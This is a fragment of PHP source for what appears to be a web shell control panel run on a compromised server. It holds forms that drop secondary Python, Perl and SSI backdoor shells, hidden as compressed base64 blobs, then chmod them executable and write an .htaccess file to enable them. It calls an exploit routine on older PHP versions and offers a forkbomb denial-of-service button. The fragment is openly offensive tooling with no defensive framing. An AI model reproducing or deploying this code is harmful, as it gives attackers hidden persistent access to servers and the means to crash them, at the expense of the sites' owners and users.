    echo "<font color=\"green\">(./ writable)</font>";
   } else {
    echo "<font color=\"red\">(./ readonly)</font>";
   }
   echo '</form>';
   if ($failflag=="1") {
    echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
   }
   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'">put mini python shell into <input name="dir" type="text" maxlength="500" size="10" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" value="sh.py"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="pysh"><input name="p" type="hidden" value="e"> ';
   if (is_writable("./")) {
    echo "<font color=\"green\">(./ writable)</font>";
   } else {
    echo "<font color=\"red\">(./ readonly)</font>";
   }
   echo '</form>';
   if ($failflag=="1") {
    echo "can't find python binary (all system functions disabled) assuming /usr/bin/python<br>";
   }
   echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'">put mini SSI shell into <input name="dir" type="text" maxlength="500" size="10" value="."><font color="green">/</font><input name="file" type="text" maxlength="500" size="10" value="index.shtml"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="ssish"><input name="p" type="hidden" value="e"> ';
   if (is_writable("./")) {
    echo "<font color=\"green\">(./ writable)</font>";
   } else {
    echo "<font color=\"red\">(./ readonly)</font>";
   }
   echo '</form>';
   echo '<br>';
   //code by Eric A. Meyer, license CC BY-SA
   echo '<script type="text/javascript">function encode() { var obj = document.getElementById("dencoder"); var unencoded = obj.value; obj.value = encodeURIComponent(unencoded); } function decode() { var obj = document.getElementById("dencoder"); var encoded = obj.value; obj.value = decodeURIComponent(encoded.replace(/\+/g,  " ")); } </script>';
   echo "<font color='blue'>---> Text encoderz/decoderz</font><br><br>";
   echo "fast URL-encoder:<br>";
   echo '<form onsubmit="return false;" action="javascript;"><textarea cols="80" rows="4" id="dencoder"></textarea><div><input type="button" onclick="decode()" value="Decode"> <input type="button" onclick="encode()" value="Encode"></div></form>';
   echo "<br>other encoders: ";
   $cryptform="<form action=\"".$_SERVER['PHP_SELF']."\" method=\"post\">
   <input name=\"p\" type=\"hidden\" value=\"e\">
   <textarea name=\"text\" cols=\"80\" rows=\"4\">";
   if(isset($_POST["text"])) { 
    $cryptform.=$_POST["text"];
    $hash=$_POST['hash'];
    $hash1=$_POST['hash1'];
    $hash2=$_POST['hash2'];
   } else {
    $hash=genSalt('zxcv',8);
    $hash1=genSalt('zxcv',8);
    $hash2=genSalt('zxcv',6,1);
   }
   $cryptform.="</textarea><br>
   <select name=\"cryptmethod\"> 
   <option value=\"asc2hex\"".($_POST["cryptmethod"] == "asc2hex"?" selected":"").">ASCII to Hex</option> 
   <option value=\"hex2asc\"".($_POST["cryptmethod"] == "hex2asc"?" selected":"").">Hex to ASCII</option> 
   <option value=\"b64enc\"".($_POST["cryptmethod"] == "b64enc"?" selected":"").">Base64 Encode</option> 
   <option value=\"b64dec\"".($_POST["cryptmethod"] == "b64dec"?" selected":"").">Base64 Decode</option> 
   <option value=\"crypt\"".($_POST["cryptmethod"] == "crypt"?" selected":"").">DES</option> 
   <option value=\"entityenc\"".($_POST["cryptmethod"] == "entityenc"?" selected":"").">HTML Entities Encode</option> 
   <option value=\"entitydec\"".($_POST["cryptmethod"] == "entitydec"?" selected":"").">HTML Entities Decode</option> 
   <option value=\"md5\"".($_POST["cryptmethod"] == "md5"?" selected":"").">MD5</option>
   <option value=\"md5md5\"".($_POST["cryptmethod"] == "md5md5"?" selected":"").">MD5(MD5)</option>
   <option value=\"md5unix\"".($_POST["cryptmethod"] == "md5unix"?" selected":"").">MD5(Unix - \$1\$)</option>
   <option value=\"md5wp\"".($_POST["cryptmethod"] == "md5wp"?" selected":"").">MD5(WordPress - \$P\$B)</option>
   <option value=\"md5bb\"".($_POST["cryptmethod"] == "md5bb"?" selected":"").">MD5(PHPBB3 - \$H\$9)</option>
   <option value=\"md5apr\"".($_POST["cryptmethod"] == "md5apr"?" selected":"").">MD5(APR1 - \$apr1\$)</option>
   <option value=\"blowfish\"".($_POST["cryptmethod"] == "blowfish"?" selected":"").">Blowfish - \$2a\$</option>
   <option value=\"sha1\"".($_POST["cryptmethod"] == "sha1"?" selected":"").">SHA1</option>
   <option value=\"sha256\"".($_POST["cryptmethod"] == "sha256"?" selected":"").">SHA256 - \$5\$</option>
   <option value=\"sha512\"".($_POST["cryptmethod"] == "sha512"?" selected":"").">SHA512 - \$6\$</option>
   <option value=\"mysql4\"".($_POST["cryptmethod"] == "mysql4"?" selected":"").">MySQL4</option>
   <option value=\"mysql5\"".($_POST["cryptmethod"] == "mysql5"?" selected":"").">MySQL5</option>
   </select> salt: <input type=\"text\" name=\"hash\" size=\"9\" maxlength=\"8\" value=\"".$hash."\"> <input type=\"text\" name=\"hash1\" size=\"9\" maxlength=\"8\" value=\"".$hash1."\"> <input type=\"text\" name=\"hash2\" size=\"7\" maxlength=\"6\" value=\"".$hash2."\"> <font color=\"gray\">(salt needed for: md5(unix,wordpress,phpbb3,apr1) - 8 symbols, sha(256,512) - 16 symbols, and blowfish - 22 symbols. ignore these fields if you use other algorithms)</font><br>
   <input type=\"submit\" name=\"crypt\" value=\"go\"> 
   </form>";
   echo $cryptform;
   if(isset($_POST['crypt'])) {
    $text=$_POST['text'];
    if($text == '') {
     die("<p>empty form</p>\n".$pageend."");
    }
    $hash=$_POST['hash'];
    $hash1=$_POST['hash1'];
    $hash2=$_POST['hash2'];
    echo("--><br><textarea cols=\"80\" rows=\"4\">");
    switch ($_POST['cryptmethod']) {
    case "asc2hex":
     $text=asc2hex($text);
     break;
    case "hex2asc":
     $text=hex2asc($text);
     break;
    case 'b64enc':
     $text=base64_encode($text);
     break;
    case 'b64dec':
     $text=base64_decode($text);
     break;
    case 'crypt':
     $text=crypt($text,'CRYPT_STD_DES');
     break;
    case 'entityenc':
     $text=entityenc($text);
     break;
    case 'entitydec':
     $text=entitydec($text);
     break;
    case 'md5':
     $text=md5($text);
     break;
    case 'md5md5':
     $text=md5(md5($text));
     break;
    case 'md5unix':
     $text=unap($text,$hash,'$1$');
     break;
    case 'md5wp':
     $text=phpass($text,$hash,8192,'$P$B');
     break;
    case 'md5bb':
     $text=phpass($text,$hash,2048,'$H$9');
     break;
    case 'md5apr':
     $text=unap($text,$hash,'$apr1$');
     break;
    case 'sha1':
     $text=sha1($text);
     break;
    case 'sha256':
     $text=crypt($text,'$5$'.$hash.$hash1);
     break;
    case 'sha512':
     $text=crypt($text,'$6$'.$hash.$hash1);
     break;
    case 'blowfish':
     $text=crypt($text,'$2a$07$'.$hash.$hash1.$hash2);
     break;
    case 'mysql4':
     $text=mysql4($text);
     break;
    case 'mysql5':
     $text='*'.strtoupper(sha1(sha1($text,TRUE)));
     break;
    }
    $text=htmlentities($text);
    echo("$text</textarea><br>");
   }
   //decoders end
   echo '<br><br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><input name="p" type="hidden" value="e"><input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb"></form>';
   echo $pageend;
  }
  if (!empty($_POST["extraz"])) {
   switch ($_POST["extraz"]) {
    case "fork":
     while(pcntl_fork()|1); 
     break;
    case "pysh":
     //code by Michael Foord & 12309, license WTFPL 
     if ($failflag=="1") {
      $pybin="/usr/bin/python";
     } else {
      $pybin=search("python",$failflag);
     }
     $pyshcode='#!'.$pybin;
     $pyshcode.="\n";
     $pyshcode.=gzinflate(base64_decode("bVRRT9swEH7Pr7jlpa0IKWObtLGmUoEClWBFbR82QRW5idNaS+LIdqBl2n/fnZ10BfGU3N33fXc+n8+o3ZkHoqikMpCshVl9d5+Ql2yV827P49uEVwZRFdPaa6B6pwMCBiC1h0aoTcqVgggaQ9bGy5QswIiCtwm0URnZrYpRLOErlvx20LlRolxPpi28tRuhFtyGK4yaGMvzRIZlYMVPQsky3DAd/+a7rj+/mE3uF/GP0d3Y7+EBdKJEZUqGBUUHhIdXwKXHc83fon3fS3kGa24yqYruE8trngttAjAbTq4ASmkqxTUvTdTpULqUGYbUP389QARkgucpiBL2ZMQAlo7EVmVfuwWTCFiZB2svUe1/Fow1lVoVMLuKdxudBt+DD5HzPyyd2Bu11/DQVkawvbArViO0YFU3Z8UqZbA9g63DBm8Ueu/kcAoeKG5qVdqg17A2nKW2uf7gZnF3OxzcjEeXw8FisrgdD9ELR4e3cERAOAYGF9cTWO3gqn552RWsDKCuUJan5Px4+unk26DvNAZ9p3g+vfxFgt5KpjteUtLOoG+9CKHUHQ/HF0viWtvg+XAuC242OIDwjN2GZ5yUNXJQbDYc3M/GSMG2xzHVFscQISuOCybKOO7Qa6HpBP9Clgbpx3QLZ2D41vQ3psj9BmBHo8CM+JbCK2rZ3EjF1vTw2gFqh+6hkxRpZxmQgVHsIdoYt+12sTbtQX+91mgafTWd3cHdeHEzvYwe/fvpfPHoA0uMkGX0fsuHA1FWtQHyIAUTIYPOgwYdCC0tXsj6fPLou/44RgPS9aoQBLOjgI5r2eL6VI69mdeVezTS7oQ0hy5Gt9IJGndgb9CpLMY/F6PZeASJzHXkfz3xQcln/Dv94uM14duwaw4g2Yg8jXE9CRyavYG7yi2ESla8PO26BL03hDDJpbb3AjjLus6JdKgRKmx39zWN3Ac8dw7HpvdrVyuM7QcvIAD36hxsP5DkyjBZuw8PtGj94bLIeZRZJ81LFuLE2FZ3e6GucmFyUXLtWLSJyKRFxNwTd9nIedDpfttT6p9zNm/H+wc="));
     $htaccess=$htaccesses['cgi'];
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     $fh=fopen($_POST["dir"]."/".$_POST["file"],"w");
     if (!$fh) { echo "can`t fopen ".$_POST["dir"]."/".$_POST["file"]."!"; }
     else {
      fwrite($fh,$pyshcode);
      fclose($fh);
      echo $_POST["file"]." write done, chmoding..<br>";
      $ch=chmod($_POST["dir"]."/".$_POST["file"], 0755);
      if (!$ch) {
       echo "chmod failed, make chmod 755 manually<br>";
      } else {
       echo "chmod done<br>";
      }
      if ($_POST["htaccess"] == "on") {
       $fh=fopen($_POST["dir"]."/.htaccess","w");
       fwrite($fh,$htaccess);
       fclose($fh);
       echo "htaccess done";
      }
     }
     break;
    case "perlsh":
     //author/license unknown
     if ($failflag=="1") {
      $perlbin="/usr/bin/perl";
     } else {
      $perlbin=search("perl",$failflag);
     }
     $perlshcode='#!'.$perlbin;
     $perlshcode.="\n";
     $perlshcode.=gzinflate(base64_decode("TVFLTwIxEL73V4wNMSXZFdSYGBY2QQ7E+DioRxKtu7PSpNuubRdQ5L87XYR4m3bme8w3rUeYzW/hcz1IjX3dLEOtYeSDNKV05SBj7X5gNJpJ19CYqGSQ2r/YG2fXHl0/Y41TJsASZYlOpMVSOo8BJjnwNlTpNe8njAhdeI3kItXSfHRd1/IE0qCCxu7NiUtVIKCRTtaiD33YsvoLeiuY/P3xFT8K9lYJ8PG7yxeGZ91cUDXalqThcpgxbQupofd8O99O758edvTt23fYQqEtLXU3fTwwcSCCUiHwPwaewS5jvUaVBLINGkHTpEZOLvLTc/iJLjpAIc0bWTk5IxPQGo3eg4hAGsAV6W+Z1NLV4mDuaL+zPg64oWhQQmG1nyz49XDBISZL9cXVgufkbL1UGgWMyUMeM4GOgCwemQYHmjySEmSvOSSxf8vu2AGxP0dlXZ2wCK0U6lKkRtY4ySljOotX31RTkFTTHi3uL5TEDGsVBJ/beFg0ZUcDVHT3pbU31I7Svw=="));
     $htaccess=$htaccesses['cgi'];
     if (strnatcmp(version(),"5.2.9") <= 0) { 
      sploent516();
     }
     $fh=fopen($_POST["dir"]."/".$_POST["file"],"w");
     if (!$fh) { echo "can`t fopen ".$_POST["dir"]."/".$_POST["file"]."!"; } 
     else {
      fwrite($fh,$perlshcode);
      fclose($fh);
      echo $_POST["file"]." write done, chmoding..<br>";
      $ch=chmod($_POST["dir"]."/".$_POST["file"], 0755);
      if (!$ch) {
       echo "chmod failed, make chmod 755 manually<br>";
      } else {
       echo "chmod done<br>";
      }
      if ($_POST["htaccess"] == "on") {
       $fh=fopen($_POST["dir"]."/.htaccess","w");
       fwrite($fh,$htaccess);
       fclose($fh);
       echo "htaccess done";
      }
     }
     break;
    case "ssish":
     // code by profexer
     $ssishcode=gzinflate(base64_decode("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"));
     $htaccess=$htaccesses['ssi'];
     if (strnatcmp(version(),"5.2.9") <= 0) { 
      sploent516();
     }
     $fh=fopen($_POST["dir"]."/".$_POST["file"],"w");
     if (!$fh) { echo "can`t fopen ".$_POST["dir"]."/".$_POST["file"]."!"; }
     else {
      fwrite($fh,$ssishcode);
      fclose($fh);
      echo $_POST["file"]." write done<br>";
      if ($_POST["htaccess"] == "on") {
       $fh=fopen($_POST["dir"]."/.htaccess","w");
       fwrite($fh,$htaccess);
       fclose($fh);
       echo "htaccess done";
      }
     }
     break;
   }
  }
  break;
// extras end ###
 case "pi":
  phpinfo();
  break;
} 
// :)
?>
